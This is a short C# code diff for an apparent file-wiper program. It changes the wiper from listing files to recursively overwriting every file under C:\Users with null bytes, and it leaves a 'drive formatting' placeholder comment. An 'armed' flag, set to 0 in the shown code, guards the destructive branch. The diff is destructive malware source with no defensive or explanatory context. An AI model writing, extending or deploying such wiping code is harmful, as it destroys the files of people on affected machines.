@@ -7,7 +7,6 @@ namespace emu
         
         static void wipe(string Filepath)
         {
-            Console.WriteLine(Filepath);
             byte[] byteray = nullwrite(Filepath.Length);
             File.WriteAllBytes(Filepath, byteray);
         }
@@ -23,11 +22,13 @@ namespace emu
             int armed = 0;
             if (armed == 1)
             {
-                DirectoryInfo directoryinfo = new DirectoryInfo("C:\\users\\");
-                foreach (FileInfo file in directoryinfo.GetFiles())
+                string[] files = Directory.GetFiles("C:\\Users\\", "*.*", SearchOption.AllDirectories);
+                foreach (string file in files)
                 {
-                    Console.WriteLine(file.FullName);
+                    //Console.WriteLine("deleting: " + file);
+                    wipe(file);
                 }
+                // drive formatting
             }
             else if (armed == 0 && args[0].Length > 0)
             {
